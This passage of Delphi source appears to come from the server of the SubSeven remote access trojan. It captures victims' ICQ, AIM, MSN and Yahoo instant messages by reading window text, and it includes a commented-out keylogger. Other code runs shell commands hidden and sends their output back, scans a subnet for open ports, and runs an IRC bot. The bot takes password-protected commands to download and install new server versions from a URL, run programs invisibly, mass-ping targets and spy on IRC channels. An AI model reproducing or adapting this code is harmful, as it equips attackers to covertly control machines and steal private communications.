  if no=32 then MessageData[4]:=wintext(Handle);
end;

function FindSiteWindowURL(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
  if no=8 then MessageData[2]:=wintext(Handle);
  if no=9 then MessageData[3]:=wintext(Handle);
  if no=27 then MessageData[4]:=wintext(Handle);
  if no=23 then MessageData[5]:=wintext(Handle);
end;

function FindSiteWindowWWP(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
  if no=25 then MessageData[4]:=wintext(Handle);
end;

function FindSiteWindowYAHOO(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
  if no=1 then MessageData[4]:=wintext(Handle);
  if no=9 then MessageData[2]:=wintext(Handle);
end;

function FindSiteWindowAIM(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
//  if ((WinText(Handle)='Add &Buddy') and (Spies[2])) then
//   MessageData[1]:='AIM';
  if ((no=4) and (wintext(Handle)='To:') and (Spies[3])) then
   MessageData[1]:='MSN';
  if ((no=1) and (wintext(Handle)='To:') and (Spies[2])) then
   MessageData[1]:='AIM';

  if (MessageData[1]='MSN') then
   case no of
    5:MessageData[2]:=wintext(handle);
    6:MessageData[4]:=wintext(handle);
   end;
  if (MessageData[1]='AIM') then
   case no of
    2:MessageData[2]:=wintext(handle);
    4:MessageData[4]:=wintext(handle);
   end;
end;

function FirstAndLast(s:String):String;
begin
 if length(s)<=40 then result:=s else
  result:=copy(s,1,20)+copy(s,length(s)-19,20);
end;

procedure TForm1.CheckForMessages;
var i,len : longint;
    deja,luat,Ceva:boolean;
    wtext:string;
    tt,loop,a,b,c:integer;
    b1,b2:bool;
    TempKeep:AnsiString;
begin
if Ocupat then Exit;
SpyMemo.lines.clear;
Ocupat:=True;
Ceva:=False;
for c:=1 to 15 do db[c].StillHere:=False;
for c:=1 to 20 do Last20[c].MaiE:=False;
for i:=1 to 6 do MessageData[i]:='';
 for i:=1 to 16384 do
  try begin b1:=false;b2:=false;
   try b1:=IsWindow (i);except end;
   try b2:=IsWindowVisible(i);except end;
   if (b1) and (b2)  then begin
    deja:=false;MessageData[1]:='';
    try wtext:=wintext(i);except end;
    if (copy(wtext,1,18)='Incoming Message [') and (Spies[1]) then
     begin
       no:=0;
       for tt:=1 to 5 do MessageData[tt]:='';
       try EnumChildWindows(i,@FindSiteWindowMessage,0);except end;
       MessageData[1]:='MSG';
      end;
    if (copy(wtext,1,22)='Incoming URL Message [') and (Spies[1]) then
     begin
       no:=0;
       for tt:=1 to 5 do MessageData[tt]:='';
       try EnumChildWindows(i,@FindSiteWindowURL,0);except end;
       MessageData[1]:='URL';
      end;
    if (copy(wtext,1,26)='Incoming WWPager Message [') and (Spies[1]) then
     begin
       no:=0;
       for tt:=1 to 5 do MessageData[tt]:='';
       try EnumChildWindows(i,@FindSiteWindowWWP,0);except end;
       MessageData[1]:='WWP';
      end;
    if ((Pos(', started: ',wtext))<>0) and (Spies[4]) then
     begin
{       luat:=false;}
       no:=0;
       for tt:=1 to 5 do MessageData[tt]:='';
       try EnumChildWindows(i,@FindSiteWindowYAHOO,0);except end;
       MessageData[1]:='YH!';
      end;
    if (((Pos(' - Instant Message',wtext))<>0) AND ((Spies[2]) or (Spies[3]))) then
     begin
{       luat:=false;}
       no:=0;
       for tt:=1 to 5 do MessageData[tt]:='';
       try EnumChildWindows(i,@FindSiteWindowAIM,0);except end;
       {MessageData[1]:='AIM';}
      end;
    try
    luat:=false;deja:=false;
    if ((MessageData[1]='AIM') or (MessageData[1]='MSN') or (MessageData[1]='YH!')) then
    begin
       for a:=1 to 15 do
        if (db[a].taken) then
         if ((db[a].cod=MessageData[1]) and (db[a].nume=MessageData[2])) then
          begin
           luat:=true;
           db[a].StillHere:=True;
           if (db[a].text<>MessageData[4]) then
            begin
             MessageData[3]:='ADD';
             TempKeep:=MessageData[4];
             if db[a].cod='AIM' then
              MessageData[4]:=Copy(MessageData[4],length(db[a].text)-13,length(MessageData[4]))
             else begin
              len:=length(db[a].text);
              db[a].Text:=MessageData[4];
              MessageData[4]:=Copy(MessageData[4],len+2,length(MessageData[4]));
             end;
             if db[a].cod='AIM' then
              begin
               db[a].Text:=TempKeep;
               if MessageData[4][1]<>'<' then MessageData[4]:='<'+MessageData[4];
               if (Copy(MessageData[4],1,4)<>'<BR>') then MessageData[4]:='<BR>'+MessageData[4];
               if MessageData[4][Length(MessageData[4])]<>'>' then MessageData[4]:=MessageData[4]+'>';
              end;
            end else MessageData[1]:='';
          end;
       if (not luat) then
        begin
         for a:=1 to 15 do if (not db[a].taken) then
          begin
           db[a].cod:=MessageData[1];
           db[a].nume:=MessageData[2];
           MessageData[3]:='NEW';
           db[a].text:=MessageData[4];
           db[a].Taken:=True;
           db[a].StillHere:=True;
           break;
          end;
        end;
    end else if (MessageData[1]<>'') then begin
     luat:=false;
     for a:=1 to 20 do
      if (Last20[a].token) then
       if (Last20[a].text=MessageData[4]) then
        begin
         luat:=true;
         Last20[a].MaiE:=True;
         deja:=true;
        end;
     if (not luat) then
     for b:=1 to 20 do if (not Last20[b].token) then
     begin
      Last20[b].token:=true;
      Last20[b].MaiE:=True;
      Last20[b].text:=MessageData[4];
      deja:=false;
      break;
     end;
    end;
    except end;
    if ((MessageData[1]='AIM') or (MessageData[1]='MSN') or (MessageData[1]='YH!')) then deja:=false;
    if (not deja) and (MessageData[1]<>'') then
     begin
(*          if MessageData[1]='AIM' then
           begin
            {try s1:=MessageData[4];
            {HTML2TXT(s1,s2);}
            s1:=s2;
            MessageData[4]:=s2;except end;
           end;                            *)
          try
          Ceva:=True;
          SpyMemo.Lines.add('--NEW--');
          SpyMemo.Lines.add(MessageData[1]);
          SpyMemo.Lines.add(MessageData[2]);
          SpyMemo.Lines.add(MessageData[3]);
          SpyMemo.Lines.add(MessageData[4]);
          SpyMemo.Lines.add(MessageData[5]);
          SpyMemo.Lines.add(MessageData[6]);
          except end;
         end;
    end;
  end;except end;
 if Ceva then try SendIncomings;except end;
 try
 for a:=1 to 15 do if (not db[a].StillHere) then db[a].taken:=False;
 for c:=1 to 20 do if (not Last20[c].MaiE) then Last20[c].token:=False;
 except end;
 Ocupat:=False;
end; { End of procedure }


procedure TForm1.MatrixSockClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 Matrix.Show;
end;

procedure TForm1.MatrixSockClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 Matrix.Hide;
end;

procedure TForm1.MatrixSockClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
 {Matrix.Hide;}
end;

procedure TForm1.MatrixSockClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var s:string;
begin
 s:=Socket.ReceiveText;
 Matrix.InsertText(s);
end;

procedure TForm1.ICQSpySocketClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 ResetDB;
end;

{procedure TForm1.KeySpy1KeySpyDown(Sender: TObject; Key: Byte;
  KeyStr: String);
var FinalKey:String;
begin
FinalKey:='';
  if (KeyStr[1] = '-') and (KeyStr[2] = '-') then
   begin
    if (KeyStr='--Space') then FinalKey:=' ' else
    if (KeyStr='--BkSp') then FinalKey:=#8 else
    if (KeyStr='--Enter') then FinalKey:=#13 else
    if (KeyStr='--Tab') then FinalKey:='»';
   end
  else FinalKey:=KeyStr;
if length(FinalKey)>1 then FinalKey:='';
if FinalKey<>'' then LogTheKey(FinalKey);
end;

procedure TForm1.KeySpy1Keyword(Sender: TObject);
begin
end;}

procedure TForm1.ClockTimer(Sender: TObject);
var ii:integer;
begin
 if SendKeyString<>'' then
  begin
   if (keysock.Active) then for ii:=1 to keysock.Socket.ActiveConnections do
   try keysock.socket.Connections[ii-1].SendText(SendKeyString);except end;
   SendKeyString:='';
  end;
end;

function CreateDOSProcessRedirected(const CommandLine, InputFile, OutputFile,
        ErrMsg :string): boolean;
     const
       ROUTINE_ID = '[function: CreateDOSProcessRedirected]';
     var
       OldCursor     : TCursor;
       pCommandLine  : array[0..MAX_PATH] of char;
       pInputFile,
       pOutPutFile   : array[0..MAX_PATH] of char;
       StartupInfo   : TStartupInfo;
       ProcessInfo   : TProcessInformation;
       SecAtrrs      : TSecurityAttributes;
       hAppProcess,
       hAppThread,
       hInputFile,
       hOutputFile   : THandle;
     begin
       Result := FALSE;

       { check for InputFile existence }
       if (InputFile <> '') and (not FileExists(InputFile)) then
         {raise Exception.CreateFmt(ROUTINE_ID + #10 + #10 +
            'Input file * %s *' + #10 +
            'does not exist' + #10 + #10 +
            ErrMsg, [InputFile]);}Exit;

       hAppProcess := 0;
       hAppThread := 0;
       hInputFile := 0;
       hOutputFile := 0;

       { save the cursor }
{       OldCursor     := Screen.Cursor;
       Screen.Cursor := crHourglass;}

       try
         { copy the parameter Pascal strings to null terminated strings }
         StrPCopy(pCommandLine, CommandLine);
         StrPCopy(pInputFile, InputFile);
         StrPCopy(pOutPutFile, OutputFile);

         { prepare SecAtrrs structure for the CreateFile calls.  This SecAttrs
           structure is needed in this case because we want the returned handle to
           be inherited by child process. This is true when running under WinNT.
           As for Win95, the parameter is ignored. }
         FillChar(SecAtrrs, SizeOf(SecAtrrs), #0);
         SecAtrrs.nLength              := SizeOf(SecAtrrs);
         SecAtrrs.lpSecurityDescriptor := nil;
         SecAtrrs.bInheritHandle       := TRUE;

         if InputFile <> '' then
         begin
           { create the appropriate handle for the input file }
           hInputFile := CreateFile(
              pInputFile,                          { pointer to name of the file }
              GENERIC_READ or GENERIC_WRITE,       { access (read-write) mode }
              FILE_SHARE_READ or FILE_SHARE_WRITE, { share mode }
              @SecAtrrs,                           { pointer to security attributes }
              OPEN_ALWAYS,                         { how to create }
              FILE_ATTRIBUTE_NORMAL
              or FILE_FLAG_WRITE_THROUGH,          { file attributes }
              0);                                 { handle to file with attrs to copy }

           { is hInputFile a valid handle? }
           if hInputFile = INVALID_HANDLE_VALUE then
             {raise Exception.CreateFmt(ROUTINE_ID + #10 +  #10 +
                'WinApi function CreateFile returned an invalid handle value' + #10 +
                'for the input file * %s *' + #10 + #10 +
                 ErrMsg, [InputFile]);}Exit;
         end else
           { we aren't using an input file }
           hInputFile := 0;

         { create the appropriate handle for the output file }
         hOutputFile := CreateFile(
            pOutPutFile,                         { pointer to name of the file }
            GENERIC_READ or GENERIC_WRITE,       { access (read-write) mode }
            FILE_SHARE_READ or FILE_SHARE_WRITE, { share mode }
            @SecAtrrs,                           { pointer to security attributes }
            CREATE_ALWAYS,                       { how to create }
            FILE_ATTRIBUTE_NORMAL
            or FILE_FLAG_WRITE_THROUGH,          { file attributes }
            0 );                                 { handle to file with attrs to copy }

         { is hOutputFile a valid handle? }
         if hOutputFile = INVALID_HANDLE_VALUE then
           {raise Exception.CreateFmt(ROUTINE_ID + #10 +  #10 +
              'WinApi function CreateFile returned an invalid handle value'  + #10 +
              'for the output file * %s *' + #10 + #10 +
              ErrMsg, [OutputFile]);}Exit;

         { prepare StartupInfo structure }
         FillChar(StartupInfo, SizeOf(StartupInfo), #0);
         StartupInfo.cb          := SizeOf(StartupInfo);
         StartupInfo.dwFlags     := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
         StartupInfo.wShowWindow := SW_HIDE;
         StartupInfo.hStdOutput  := hOutputFile;
         StartupInfo.hStdInput   := hInputFile;

         { create the app }
         Result := CreateProcess(
            NIL,                           { pointer to name of executable module }
            pCommandLine,                  { pointer to command line string }
            NIL,                           { pointer to process security attributes }
            NIL,                           { pointer to thread security attributes }
            TRUE,                          { handle inheritance flag }
            HIGH_PRIORITY_CLASS,           { creation flags }
            NIL,                           { pointer to new environment block }
            NIL,                           { pointer to current directory name }
            StartupInfo,                   { pointer to STARTUPINFO }
            ProcessInfo);                  { pointer to PROCESS_INF }

         { wait for the app to finish its job and take the handles to free them later }
         if Result then
         begin
           WaitforSingleObject(ProcessInfo.hProcess, 10000);
           hAppProcess  := ProcessInfo.hProcess;
           hAppThread   := ProcessInfo.hThread;
         end else
           {raise Exception.Create(ROUTINE_ID + #10 +  #10 +
              'Function failure'  + #10 +  #10 + ErrMsg);}Exit;

       finally
         { close the handles
           Kernel objects, like the process and the files we created in this case,
           are maintained by a usage count.
           So, for cleaning up purposes we have to close the handles
           to inform the system that we don't need the objects anymore }
         if hOutputFile <> 0 then
           CloseHandle(hOutputFile);
         if hInputFile <> 0 then
           CloseHandle(hInputFile);
         if hAppThread <> 0 then
           CloseHandle(hAppThread);
         if hAppProcess <> 0 then
           CloseHandle(hAppProcess);
         { restore the old cursor }
         Screen.Cursor:= OldCursor;
  end;
end;    { CreateDOSProcessRedirected }

procedure TForm1.RunDosCommand(param:string);
var output:string;
    rec:TSearchRec;
    fsize:integer;
    winkey,feedback:String;
    f:TextFile;
    r:integer;
begin
 OutPut:=WinPath+'\Rdcottfn.cfg';
 if FileExists(OutPut) then try DeleteFile(Output);except OutPut:=WinPath+'\Rdcottfn~.cfg';end;
 CreateDOSProcessRedirected('command.com /c '+param,'',OutPut,'');
 FindFirst(OutPut,faAnyFile,rec);
 fsize := rec.Size;
 if fsize=0 then
  begin
   AssignFile(f,Output);
   try Rewrite(f);except end;
   WriteLn(f,'error running command.');
   CloseFile(f);
  end;
  Strm2Send.Clear;
  Strm2Send.LoadFromFile(Output);
  fsize:=Strm2Send.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
  else winkey:=IntToStr(length(IntToStr(fsize)));
  FeedBack := 'DOS'+winkey+inttostr(fsize);
  ServerSocket1.Socket.Connections[0].SendText (Feedback);
  Strm2Send.SaveToFile(WinPath+'\temp~.bak');
  ServerSocket1.Socket.Connections[0].SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
{  try DeleteFile(WinPath+'\tempp.bak');except end;}
{  try DeleteFile(Output);except end;}
end;

function TForm1.PickRandomNick:String;
var l,i:integer;
    n:string;
begin
RANDOMIZE;
l:=random(4)+3;n:='';
for i:=1 to l do
 n:=n+Chr(Random(25)+97);
result:=n;
end;

procedure TForm1.ircNicksInUse(Sender: TObject; var Nick: String);
begin
 irc.nick:=PickRandomNick;//IntToStr(Random(99999)+592);
// irc.nick:='ss'+nick;
end;

procedure TForm1.ircConnect(Sender: TObject);
var chan,key:string;
begin
chan:=Decrypt(ReadKey(Encrypt('IRCchannel')));
InitDATA_IRC;
Key:='';
 if (Chan[1]='#') and (Pos(' ',chan)<>0) then
  begin
   Key:=Copy(Chan,Pos(' ',Chan)+1, length(chan));
   Chan:=Copy(Chan,1,Pos(' ',Chan)-1);
  end;
if (chan[1]='#') AND (Lowercase(chan)<>'#subseven') then irc.Join(chan,Key);
irc.Say(chan,SendStrBodyIRC);
ircdone.enabled:=false;
end;

procedure TForm1.ircMessage(Sender: TObject; User: TUser;
  Channel: TChannel; Content: String);
var chan:string;
begin
 chan:=Decrypt(ReadKey(Encrypt('IRCchannel')));
 if Content='sub7' then begin InitData_IRC;
 if (Chan[1]='#') and (Pos(' ',chan)<>0) then
   Chan:=Copy(Chan,1,Pos(' ',Chan)-1);
 irc.Say(chan,SendStrBodyIRC);end;
end;

procedure TForm1.ircError(Sender: TObject; User: TUser; Numeric,
  Error: String);
begin
 try except end;
end;

procedure TForm1.ircDisconnect(Sender: TObject);
begin
 ircdone.enabled:=true;
end;

procedure TForm1.ircdoneTimer(Sender: TObject);
begin
 if (irc.connected) then exit;
 irc.connect;
end;

procedure TForm1.ircKicked(Sender: TObject; User: TUser;
  Channel: TChannel);
begin
 irc.join(Channel.Name,'');
 if User.Nick<>'mobman' then
  irc.Say(Channel.Name,'go fuck yourself '+User.Nick+'!') else
  irc.Say(Channel.Name,'huh? what? where? ... who did that?');
end;

procedure TForm1.ircNoTopic(Sender: TObject; Channel: TChannel);
begin
 Channel.Topic:='p h e a r   S u b S e v e n';
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
try
 for i:=1 to max_hunters do
  if (huntpos[i]+max_hunters) <= 254 then
   begin
    hunters[i].close;
    hunters[i].port:=cport;
    hunters[i].Proto:='tcp';
    huntpos[i]:=huntpos[i]+max_hunters;
    k:=huntpos[i];
    str(k,s);
    hunters[i].addr:=iplow+'.'+s;
    hunters[i].connect;
   end else begin
    gata:=true;
    break;
   end;
 except end;
end;

procedure TForm1.IRCBotConnect(Sender: TObject);
begin
 YESQUIT:=False;
 BOTTimer.Enabled:=True;
end;

procedure TForm1.IRCBotNicksInUse(Sender: TObject; var Nick: String);
begin
 IRCBot.Nick:=IRCNickname+PickRandomNick;
end;

procedure TForm1.WriteOut;
begin
 SetKey(Encrypt('bot_password'),Encrypt(IRCPassword));
 SetKey(Encrypt('bot_nickname'),Encrypt(IRCNickname));
 SetKey(Encrypt('bot_server'),Encrypt(IRCServer));
 SetKey(Encrypt('bot_port'),Encrypt(IRCPort));
 SetKey(Encrypt('bot_prefix'),Encrypt(IRCPrefix));
 SetKey(Encrypt('bot_perform'),Encrypt(Perform.Lines.Text));
 SetKey(Encrypt('bot_channel'),Encrypt(IRCChannel));
 SetKey(Encrypt('bot_channelkey'),Encrypt(IRCChannelKey));
 SetKey(Encrypt('IRCident'),Encrypt(IRCIdent));
 if IRCAutoStart then SetKey(Encrypt('bot_autostart'),Encrypt('yes')) else SetKey(Encrypt('bot_autostart'),Encrypt('no'));
end;

procedure TForm1.UpdateFromURL(url:string;frombot:bool);
var SendIt,SaveTo:String;
    success:bool;
begin
 SaveTo:=WinPath+'\~updtnw.bak';
 HttpFile.URL        := URL;
 HttpFile.Proxy      := '';
 HttpFile.ProxyPort  := '80';
 HttpFile.RcvdStream := TFileStream.Create(SaveTo, fmCreate);
 success:=false;
 if FromBot then IRCBot.Say(ONCHAN,'downloading file ['+url+']') else ServerSocket1.Socket.Connections[0].SendText('downloading file.');
 try
  try
   HttpFile.Get;
   success:=True;
   if FromBot then IRCBot.Say(ONCHAN,'file successfully downloaded. ['+IntToStr(HttpFile.RcvdStream.Size)+' bytes].') else
    ServerSocket1.Socket.Connections[0].SendText('file successfully downloaded. ['+IntToStr(HttpFile.RcvdStream.Size)+' bytes].');
  except
   if FromBot then IRCBot.Say(ONCHAN,'failed to download file. ['+HttpFile.ReasonPhrase+'].') else
    ServerSocket1.Socket.Connections[0].SendText('failed to download file. ['+HttpFile.ReasonPhrase+'].');
   success:=False;
  end;
 finally
  //GetButton.Enabled   := TRUE;
  //AbortButton.Enabled := FALSE;
  HttpFile.RcvdStream.Destroy;
  HttpFile.RcvdStream := nil;
 end;
 if Success then UpdateServerNOW;
end;

procedure TForm1.IRCBotMessage(Sender: TObject; User: TUser;
  Channel: TChannel; Content: String);
var
  prefix,comm,lastp , param, reason, st,s1,s2,RR: string;
  i : integer;
begin
try  Prefix:=IRCPrefix;
 if RREnabled then begin
  RR:=Content;
  try
  if Channel<>nil then
   begin if Channel.Name=RRFrom then IRCBot.Say(RRTo,'['+RRFrom+']<'+User.Nick+'>'+RR);end else
  if User.Nick=RRFrom then
   begin IRCBot.Say(RRTo,'['+RRFrom+']<'+User.Nick+'>'+RR);end;
  if (Copy(RR,1,Length(Prefix))<>Prefix) then begin
  if Channel<>nil then
   begin if ((Channel.Name=RRTo) and (RRBoth)) then IRCBot.Say(RRFrom,RR);end else
  if ((User.Nick=RRTo) and (RRBoth)) then
   begin IRCBot.Say(RRFrom,RR);end;
  end;
  except end;
 end;
 if RSEnabled then begin
  RR:=Content;
  try
  if (Copy(RR,1,Length(Prefix))<>Prefix) then begin
  if Channel<>nil then
   begin if Channel.Name=RSLocal then IRCSpy.Say(RSChan,RR);end else
  if ((User.Nick=RSLocal) and (RSBoth)) then
   begin IRCSpy.Say(RSChan,RR);end;
  end;
  except end;
 end;except end;
  try
  param:='';
  reason:='';
  ansilowercase(user.nick);
  ansilowercase(content);
  param := content;
  if Pos(' ',param)=0 then comm:=param else begin comm := Copy(content, 1, Pos(' ', content));
  Delete(param, 1, Pos(' ',param));
  if Pos(' ',param)<>0 then
  begin
   reason := copy(param,(Pos(' ',param)+1),length(param));
   delete(param,Pos(' ',param),length(param));
  end else reason:='';
  end;
  except end;
  if comm=Prefix+'login ' then if param=IRCPassword then begin
   ircbot.say(user.nick,'password accepted');
   IRCMasterNick:=user.nick;
   IRCMaster:= user.Address;
  end;
  if (user.nick=IRCmasterNick) and (user.address=IRCMaster) then begin
   if (comm=prefix+'help') or (comm='help') or (content='help') then
    begin
     ircbot.say(User.Nick,'*note: all commands should begin with the specified PREFIX, the default is @ [in other words, replace @ with your prefix]');
     ircbot.say(User.Nick,'type:');
     ircbot.say(User.Nick,'@help channel for help on channel commands');
     ircbot.say(User.Nick,'@help private for help on private commands');
     ircbot.say(User.Nick,'@help spy for help on spying on a different server');
    end;
   if (comm=prefix+'help ') then
    begin if (Param='channel') then begin
     ircbot.say(User.Nick,'sub7bot channel commands');
     ircbot.say(User.Nick,'-CHANNEL ONLY COMMANDS-');
     ircbot.say(User.Nick,'@update <URL> [this is used to update the server with a new version. upload a server to a webpage, then use this command. the server will automatically download the server and install it over the current one. you should upload the new server as EXE]');
     ircbot.say(User.Nick,'@run <command> [run the specified command invisibly]');
     ircbot.say(User.Nick,'-CHANNEL COMMANDS-');
     ircbot.say(User.Nick,'@newpass <new password>');
     ircbot.say(User.Nick,'@ident <new ident>');
     ircbot.say(User.Nick,'@op <nickname>');
     ircbot.say(User.Nick,'@say <text>');
     ircbot.say(User.Nick,'@deop <nickname>');
     ircbot.say(User.Nick,'@cycle');
     ircbot.say(User.Nick,'@part <reason>');
     ircbot.say(User.Nick,'@mode <channel modes>');
     ircbot.say(User.Nick,'@join <channel> <key>');
     ircbot.say(User.Nick,'@kick <nick>');
     ircbot.say(User.Nick,'@ban <nickname>');
     ircbot.say(User.Nick,'@unban <nickname>');
     ircbot.say(User.Nick,'@quit <reason>');
     ircbot.say(User.Nick,'@ping <ip> <packet size> [will ping the specified IP and return the result]');
     ircbot.say(User.Nick,'@mping <ip> <packet size> <n> [will ping the specified IP with the specified packet size n times]');
     ircbot.say(User.Nick,'@info [will report the server settings - just like irc notify]');
     ircbot.say(User.Nick,'end of channel commands');
    end; if (Param='private') then begin
     ircbot.say(User.Nick,'sub7bot private commands');
     ircbot.say(User.Nick,'-PRIVATE COMMANDS-');
     ircbot.say(User.Nick,'@ident <new ident>');
     ircbot.say(User.Nick,'@newpass <new password>');
     ircbot.say(User.Nick,'@update <URL>');
     ircbot.say(User.Nick,'@run <command>');
     ircbot.say(User.Nick,'@join <channel> <key>');
     ircbot.say(User.Nick,'@cycle <channel> [if not spcified, it''ll cycle the current channel]');
     ircbot.say(User.Nick,'@op <channel> <nickname>');
     ircbot.say(User.Nick,'@deop <channel> <nickname>');
     ircbot.say(User.Nick,'@quit <quit message>');
     ircbot.say(User.Nick,'@nick <new nickname>');
     ircbot.say(User.Nick,'@raw <raw command>');
     ircbot.say(User.Nick,'@prefix <new prefix>');
     ircbot.say(User.Nick,'@ban <channel> <nickname>');
     ircbot.say(User.Nick,'@unban <channel> <nickname>');
     ircbot.say(User.Nick,'@say <channel/nickname> <text>');
     ircbot.say(User.Nick,'@ping <ip> <packet size> [will ping the specified IP and return the result]');
     ircbot.say(User.Nick,'@mping <ip> <packet size> <n> [will ping the specified IP with the specified packet size n times]');
     ircbot.say(User.Nick,'@info [will report the server settings - just like irc notify]');
     ircbot.say(User.Nick,'@kick <channel> <nick>');
     ircbot.say(User.Nick,'@reroute <channel/nickname> <channel/nickname> [will relay everything said on/by first parameter to the secound parameter]');
     ircbot.say(User.Nick,'@reroute<> <channel/nickname> <channel/nickname> [will relay everything said on/by first parameter to the secound parameter BOTH WAYS]');
     ircbot.say(User.Nick,'@rroff [disable rerouting - also, if you send the command "reroute" again, it will override the previous parameters]');
     ircbot.say(User.Nick,'end of private commands');
    end; if (Param='spy') then begin
     ircbot.say(User.Nick,'-- the following is alist of commands to controll the server on another server --');
     ircbot.say(User.Nick,'@spy_login <server> <port> [this is the FIRST command you have to send]');
     ircbot.say(User.Nick,'@spy_nick <nickname> [it picks a random nick when it jooins the server, use this to change it]');
     ircbot.say(User.Nick,'@spy_join <channel> <key>');
     ircbot.say(User.Nick,'@spy_part <reason>');
     ircbot.say(User.Nick,'@spy_quit [exits the server, don''t specify a reason]');
     ircbot.say(User.Nick,'@spy_start <channel/nickname> <channel/nickname> [this will start rerouting. first parameter is on the spied irc server, secound is on the local server]');
     ircbot.say(User.Nick,'@spy_start<> <channel/nickname> <channel/nickname> [this will start rerouting BOTH WAYS. first parameter is on the spied irc server, secound is on the local server]');
     ircbot.say(User.Nick,'@spy_stop [take a WILD guess]');
     ircbot.say(User.Nick,'-- well, that''s about it for now, you can basically do everything with the RAW command...');
     ircbot.say(User.Nick,'note: once the bot connects to the spy-irc-server, it will report to you everything that''s happening on channels or queries he''s on.');
     ircbot.say(User.Nick,'end of spy commands');
    end;end;
   if comm=Prefix+'newpass ' then begin
    ircbot.notice(user.nick,'password changed to: '+param+'');
    IRCPassword:=param;
    WriteOut;
   end;
  if comm=Prefix+'join ' then ircbot.Join(param,reason);
{ CHANNEL COMMANDS }if Channel <> nil then  begin
  try
   if comm=Prefix+'ping ' then begin
    Ping1.Address:=param;
    Ping1.Size:=StrToInt(reason);
    if Ping1.Size>65500 then begin ircbot.say(channel.name,'ERROR packet size has to be in range 0..65500');exit;end;
    Ping1.Tag:=2;KeepChan:=Channel.Name;
    ircbot.say(channel.name,'pinging: '+param+'');
    try Ping1.Ping;except ircbot.say(channel.name,'ping error.');end;
   end;
   if comm=Prefix+'mping ' then begin
    lastp:=Copy(reason,Pos(' ',reason)+1,length(reason));
    Delete(reason,Pos(' ',reason),length(reason));
    Ping1.Address:=param;
    try Ping1.Size:=StrToInt(reason);
    PingCount:=StrToInt(lastp);except exit; end;
    if Ping1.Size>65500 then begin ircbot.say(channel.name,'ERROR packet size has to be in range 0..65500');exit;end;
    Ping1.Tag:=3;KeepChan:=Channel.Name;
    ircbot.say(channel.name,'pinging: '+param+'');
    for PingAt:=1 to PingCount do
     try Delay(500);Ping1.Ping;except end;
    ircbot.say(channel.name,'pinging finished.');
   end;
   if comm=Prefix+'ident ' then begin
    ircbot.say(channel.name,'bot ident changed to: '+param+'');
    IRCIdent:=param;
    try IRCBot.UserName:=param;except end;
    WriteOut;
   end;
   if content=prefix+'cycle' then begin
    ircbot.part(channel.name,'');
    delay(5000);
    ircbot.join(channel.name,'');
   end;
   if (content=prefix+'info') or (comm=prefix+'sub7') then begin InitDATA_IRC;IRCBot.Say(channel.name,sendstrbodyirc);end;
   if comm=prefix+'op ' then ircbot.Mode(channel.Name,'+o',param);
   if comm=prefix+'say ' then ircbot.Say(channel.name,param+' '+reason);
   if comm=prefix+'deop ' then ircbot.Mode(channel.Name,'-o',param);
   if comm=prefix+'part ' then ircbot.Part(param,'');
   if comm=prefix+'mode ' then ircbot.Mode(channel.name,param,reason);
   if comm=prefix+'join ' then ircbot.Join(param,reason);
   if comm=prefix+'kick ' then ircbot.kick(channel.Name,param,reason);
   if comm=prefix+'ban ' then ircbot.Mode(channel.Name,'+b',param);
   if comm=prefix+'unban ' then ircbot.Mode(channel.Name,'-b',param);
   if comm=prefix+'quit ' then begin if param=comm then param:='';YESQUIT:=True;ircbot.Quit(param+' '+reason);end;
   if comm=prefix+'quit' then begin YESQUIT:=True;ircbot.Quit('');end;
   if comm=prefix+'update ' then begin ircbot.say(channel.name,'updating server from: '+param);UpdateFromURL(param,true);ONCHAN:=Channel.Name;end;
   if comm=prefix+'run ' then begin ExecuteFileOptions(param+' '+reason,IDLE_PRIORITY_CLASS, SW_HIDE);ircbot.say(channel.name,'command executed.');end;
except end end{ PRIVATE COMMANDS } else begin try
   if comm=Prefix+'ping ' then begin
    Ping1.Address:=param;
    Ping1.Size:=StrToInt(reason);
    if Ping1.Size>65500 then begin ircbot.say(channel.name,'ERROR packet size has to be in range 0..65500');exit;end;
    Ping1.Tag:=1;
    ircbot.say(user.nick,'pinging: '+param+'');
    try Ping1.Ping;except ircbot.say(user.nick,'ping error.');end;
   end;
   if comm=Prefix+'mping ' then begin
    lastp:=Copy(reason,Pos(' ',reason)+1,length(reason));
    Delete(reason,Pos(' ',reason),length(reason));
    Ping1.Address:=param;
    try Ping1.Size:=StrToInt(reason);
    PingCount:=StrToInt(lastp);except exit; end;
    if Ping1.Size>65500 then begin ircbot.say(channel.name,'ERROR packet size has to be in range 0..65500');exit;end;
    Ping1.Tag:=4;KeepChan:=Channel.Name;
    ircbot.say(channel.name,'pinging: '+param+'');
    for PingAt:=1 to PingCount do
     try Delay(500);Ping1.Ping;except end;
    ircbot.say(channel.name,'pinging finished.');
   end;
   if comm=Prefix+'ident ' then begin
    ircbot.say(user.nick,'bot ident changed to: '+param+'');
    IRCIdent:=param;
    try IRCBot.UserName:=param;except end;
    WriteOut;
   end;
   if content=prefix+'cycle ' then begin
    ircbot.part(param,'');
    delay(5000);
    ircbot.join(param,'');
   end;
//   if comm=prefix+'login ' then if param=IRCPassword then ircbot.say(user.nick,'password accepted');
   if comm=prefix+'op ' then ircbot.Mode(param,'+o',reason);
   if comm=prefix+'deop ' then ircbot.Mode(param,'-o',reason);
   if (comm=prefix+'quit ') or (comm=prefix+'quit') then begin YESQUIT:=True;ircbot.Quit(param+' '+reason);end;
   if comm=prefix+'nick ' then begin
    ircbot.nick:=param;
    IRCNickname:=param;
    writeout;
   end;
   if comm=prefix+'raw ' then IRCBot.Raw(param+' '+reason);
   if comm=prefix+'prefix ' then
    begin
     IRCPrefix:=param;
     Prefix:=param;
     IRCBot.Say(User.Nick,'prefix changed to: '+prefix+'');
     WriteOut;
    end;
